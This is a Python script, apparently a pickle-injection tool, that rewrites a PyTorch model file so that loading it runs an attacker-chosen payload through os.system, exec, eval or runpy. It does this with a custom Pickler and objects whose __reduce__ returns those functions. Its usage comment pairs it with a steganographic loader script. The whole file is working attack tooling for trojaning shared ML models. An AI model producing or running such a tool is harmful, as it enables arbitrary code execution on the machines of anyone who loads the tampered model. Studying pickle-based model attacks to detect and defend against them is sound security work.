import os
import argparse
import pickle
import struct
import shutil
import types
from pathlib import Path
import torch

# python torch_picke_inject.py resnet18_cifar10_scratch_best_x1.pth runpy tensor_stego_loader.py

def make_pickle_module(inj_objs, first=True):
    """Create a fake pickle module with injected Pickler"""
    class InjectedPickler(pickle._Pickler):
        def __init__(self, file, protocol=pickle.HIGHEST_PROTOCOL):
            super().__init__(file, protocol)
            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj):
            if self.proto >= 2:
                self.write(pickle.PROTO + struct.pack("<B", self.proto))
            if self.proto >= 4:
                self.framer.start_framing()

            if self.first:
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            self.save(obj)

            if not self.first:
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            self.write(pickle.STOP)
            self.framer.end_framing()

    fake_module = types.ModuleType("fake_pickle_module")
    fake_module.Pickler = InjectedPickler
    return fake_module


class PickleInjectPayload:
    """Base class for pickling injected commands"""
    def __init__(self, args, command=None):
        self.command = command
        self.args = args

    def __reduce__(self):
        return self.command, (self.args,)


class System(PickleInjectPayload):
    def __init__(self, args):
        super().__init__(args, command=os.system)


class Exec(PickleInjectPayload):
    def __init__(self, args):
        super().__init__(args, command=exec)


class Eval(PickleInjectPayload):
    def __init__(self, args):
        super().__init__(args, command=eval)


class RunPy(PickleInjectPayload):
    def __init__(self, args):
        import runpy
        super().__init__(args, command=runpy._run_code)

    def __reduce__(self):
        return self.command, (self.args, {})


def main():
    parser = argparse.ArgumentParser(description="PyTorch Pickle Inject")
    parser.add_argument("model", type=Path)
    parser.add_argument("command", choices=["system", "exec", "eval", "runpy"])
    parser.add_argument("args")
    parser.add_argument("-v", "--verbose", help="verbose logging", action="count")
    args = parser.parse_args()

    command_args = args.args
    if os.path.isfile(command_args):
        with open(command_args, "r") as in_file:
            command_args = in_file.read()

    # Construct payload
    if args.command == "system":
        payload = System(command_args)
    elif args.command == "exec":
        payload = Exec(command_args)
    elif args.command == "eval":
        payload = Eval(command_args)
    elif args.command == "runpy":
        payload = RunPy(command_args)

    # Backup the model
    backup_path = f"{args.model}.bak"
    shutil.copyfile(args.model, backup_path)

    # Save with injected payload
    pickle_module = make_pickle_module([payload])
    torch.save(torch.load(args.model, weights_only=False, map_location="cpu"), args.model, pickle_module=pickle_module)


if __name__ == "__main__":
    main()